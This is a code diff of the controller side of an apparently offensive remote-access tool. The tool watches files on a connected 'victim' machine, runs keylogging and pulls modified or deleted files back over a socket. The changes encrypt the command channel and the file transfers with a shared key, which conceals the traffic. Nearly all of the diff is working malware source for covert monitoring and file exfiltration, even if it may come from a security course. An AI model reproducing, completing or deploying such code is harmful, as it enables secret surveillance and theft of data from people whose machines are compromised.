@@ -3952,12 +3952,12 @@ def receive_file_covert(client_socket: socket.socket,
             # Send ACK to victim (if good)
             if is_file_openable(save_file_path):
                 print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
-                client_socket.send(constants.VICTIM_ACK.encode())
+                client_socket.send(encrypt_string(constants.VICTIM_ACK, shared_key).encode())
                 print(constants.RETURN_MAIN_MENU_MSG)
                 print(constants.MENU_CLOSING_BANNER)
                 return None
             else:
-                client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+                client_socket.send(encrypt_string(constants.FILE_CANNOT_OPEN_TO_SENDER, shared_key).encode())
                 print(constants.RETURN_MAIN_MENU_MSG)
                 print(constants.MENU_CLOSING_BANNER)
                 return None
@@ -4607,7 +4607,8 @@ def __process_deletion_timeout(client_ip,
                                client_socket,
                                file_path,
                                is_keylog,
-                               signal_queue: queue.Queue):
+                               signal_queue: queue.Queue,
+                               shared_secret: bytes):
     # Print Termination Statements
     print(constants.WATCH_FILE_DELETE_DETECTED_MSG.format(file_path, client_ip, client_port))
     print(constants.WATCH_FILE_THREAD_TERMINATING)
@@ -4622,7 +4623,7 @@ def __process_deletion_timeout(client_ip,
     signal_queue.put(constants.STOP_KEYWORD)
 
     # Send a signal back to client/victim to stop their watch_file_stop_signal() thread
-    client_socket.send(constants.STOP_KEYWORD.encode())
+    client_socket.send(encrypt_string(constants.STOP_KEYWORD, shared_secret).encode())
     print(constants.THREAD_STOPPED_MSG)
 
 
@@ -4633,35 +4634,40 @@ def watch_file_client_socket(client_socket: socket.socket,
                              client_list: dict,
                              client_ip: str,
                              client_port: int,
-                             is_keylog: bool):
+                             is_keylog: bool,
+                             shared_key: bytes):
     while True:
         try:
             # Check if a stop signal is received; remove signal from queue and send signal to client
             if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
-                client_socket.send(constants.STOP_KEYWORD.encode())
+                client_socket.send(encrypt_string(constants.STOP_KEYWORD, shared_key).encode())
                 break
 
             # Get Event from Client
-            event = client_socket.recv(20).decode()
+            event = decrypt_string(client_socket.recv(1024).decode(), shared_key)
 
             # MODIFY: Get File If Modified
             if event == "IN_MODIFY":
                 file_name = create_file_name(file_path)
                 new_file_path = sub_directory_path + "/" + file_name
 
-                # Receive Modified File
-                with open(new_file_path, "wb") as file:
-                    eof_marker = constants.END_OF_FILE_SIGNAL  # Define the end-of-file marker
+                # Loop to receive the modified file
+                encrypted_data = b""
+                eof_marker = constants.FILE_END_OF_FILE_SIGNAL
+                while True:
+                    file_data = client_socket.recv(1024)
+                    if not file_data:
+                        break  # No more data received
+                    if file_data.endswith(eof_marker):
+                        encrypted_data += file_data[:-len(eof_marker)]  # Exclude the end-of-file marker
+                        break
+                    encrypted_data += file_data
 
-                    while True:
-                        file_data = client_socket.recv(1024)
-                        if not file_data:
-                            break  # No more data received
-                        if file_data.endswith(eof_marker):
-                            file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
-                            break
-                        else:
-                            file.write(file_data)
+                # Decrypt and write to file
+                decrypted_data = decrypt(encrypted_data, shared_key)
+
+                with open(new_file_path, constants.WRITE_BINARY_MODE) as file:
+                    file.write(decrypted_data)
 
                 if is_file_openable(new_file_path):
                     print(constants.WATCH_FILE_TRANSFER_SUCCESS_MODIFY.format(file_name))
@@ -4682,19 +4688,23 @@ def watch_file_client_socket(client_socket: socket.socket,
                 # Generate new file path
                 deleted_file_path = deleted_dir_path + "/" + file_name
 
-                # Receive Modified File
-                with open(deleted_file_path, "wb") as file:
-                    eof_marker = constants.END_OF_FILE_SIGNAL  # Define the end-of-file marker
+                # Loop to receive the modified file
+                encrypted_data = b""
+                eof_marker = constants.FILE_END_OF_FILE_SIGNAL
+                while True:
+                    file_data = client_socket.recv(1024)
+                    if not file_data:
+                        break  # No more data received
+                    if file_data.endswith(eof_marker):
+                        encrypted_data += file_data[:-len(eof_marker)]  # Exclude the end-of-file marker
+                        break
+                    encrypted_data += file_data
 
-                    while True:
-                        file_data = client_socket.recv(1024)
-                        if not file_data:
-                            break  # No more data received
-                        if file_data.endswith(eof_marker):
-                            file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
-                            break
-                        else:
-                            file.write(file_data)
+                # Decrypt and write to file
+                decrypted_data = decrypt(encrypted_data, shared_key)
+
+                with open(deleted_file_path, constants.WRITE_BINARY_MODE) as file:
+                    file.write(decrypted_data)
 
                 if is_file_openable(deleted_file_path):
                     print(constants.WATCH_FILE_TRANSFER_SUCCESS_DELETION.format(file_name))
@@ -4707,13 +4717,13 @@ def watch_file_client_socket(client_socket: socket.socket,
         except socket.timeout:
             __process_deletion_timeout(client_ip, client_list, client_port,
                                        client_socket, file_path, is_keylog,
-                                       signal_queue)
+                                       signal_queue, shared_key)
             return None
 
         except TimeoutError:
             __process_deletion_timeout(client_ip, client_list, client_port,
                                        client_socket, file_path, is_keylog,
-                                       signal_queue)
+                                       signal_queue, shared_key)
             return None
 
     # Set WATCH_FILE status to false (Before ending thread)
@@ -4725,7 +4735,7 @@ def watch_file_client_socket(client_socket: socket.socket,
 def __perform_menu_item_9_helper(client_dict: dict, client_socket: socket.socket,
                                  target_ip: str, target_port: int, status: bool,
                                  status_2: bool, global_thread: None,
-                                 signal_queue: queue.Queue):
+                                 signal_queue: queue.Queue, shared_secret: bytes):
     # Check if currently keylogging
     if __is_keylogging(status, target_ip, target_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
         print(constants.RETURN_MAIN_MENU_MSG)
@@ -4739,18 +4749,17 @@ def __perform_menu_item_9_helper(client_dict: dict, client_socket: socket.socket
         return global_thread
     else:
         # Send the notification to the victim that commander wants to watch a file
-        client_socket.send(constants.WATCH_FILE_SIGNAL.encode())
+        client_socket.send(encrypt_string(constants.WATCH_FILE_SIGNAL, shared_secret).encode())
 
         # Prompt user input + send file path to victim
         filename = input("[+] Enter the path of the file to watch: ")
-        client_socket.send(filename.encode())
+        client_socket.send(encrypt_string(filename, shared_secret).encode())
 
         # Get Response
-        res = client_socket.recv(constants.BYTE_LIMIT).decode().split("/")
+        res = decrypt_string(client_socket.recv(constants.BYTE_LIMIT).decode(), shared_secret)
 
         # Logic
-        if res[0] == constants.STATUS_TRUE:
-            print(constants.CLIENT_RESPONSE.format(res[1]))
+        if res == constants.STATUS_TRUE:
             print("[+] Now watching file {} from client ({}, {})...".format(filename,
                                                                             target_ip,
                                                                             target_port))
@@ -4775,20 +4784,21 @@ def __perform_menu_item_9_helper(client_dict: dict, client_socket: socket.socket
                                                        client_dict,
                                                        target_ip,
                                                        target_port,
-                                                       status),
+                                                       status,
+                                                       shared_secret),
                                                  name="Watch_File_Client_Socket")
                 global_thread.daemon = True
                 global_thread.start()
                 print(constants.THREAD_START_MSG.format(global_thread.name))
                 return global_thread
         else:
-            print(constants.CLIENT_RESPONSE.format(res[1]))
+            print(constants.WATCH_FILE_DOES_NOT_EXIST)
             print(constants.RETURN_MAIN_MENU_MSG)
             print(constants.MENU_CLOSING_BANNER)
             return global_thread
 
 
-def perform_menu_item_9(client_list: dict, global_thread: None, signal_queue: queue.Queue):
+def perform_menu_item_9(client_list: dict, global_thread: None, signal_queue: queue.Queue, shared_secret: bytes):
     print(constants.START_WATCH_FILE_MSG)
 
     # CASE 1: Check if client list is empty
@@ -4799,15 +4809,14 @@ def perform_menu_item_9(client_list: dict, global_thread: None, signal_queue: qu
     if len(client_list) == constants.CLIENT_LIST_INITIAL_SIZE:
         client_socket, (client_ip, client_port, status, status_2) = next(iter(client_list.items()))
         global_thread = __perform_menu_item_9_helper(client_list, client_socket, client_ip, client_port,
-                                                     status, status_2, global_thread, signal_queue)
+                                                     status, status_2, global_thread, signal_queue, shared_secret)
         return global_thread
 
     # CASE 3: [Multiple Clients] - Watch File for a specific connected victim
     elif len(client_list) != constants.ZERO:
         ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
         port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
-        (target_socket, ip, port, status, status_2) = find_specific_client_socket(client_list,
-                                                                                  ip, port)
+        (target_socket, ip, port, status, status_2) = find_specific_client_socket(client_list, ip, port)
 
         if target_socket:
             if __is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
